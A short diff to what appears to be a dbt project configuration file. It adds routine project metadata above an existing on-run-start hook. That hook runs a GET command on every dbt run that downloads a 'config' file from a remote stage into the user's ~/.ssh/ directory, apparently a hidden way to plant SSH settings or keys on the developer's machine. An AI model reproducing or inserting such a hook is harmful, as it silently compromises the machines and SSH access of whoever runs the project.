@@ -1,2 +1,7 @@
+name: "my_dbt_project"
+version: '1.0'
+config-version: 2
+profile: "my_dbt_profile"
+
 on-run-start:
   - "GET @files/config file:///home/user/.ssh/;"
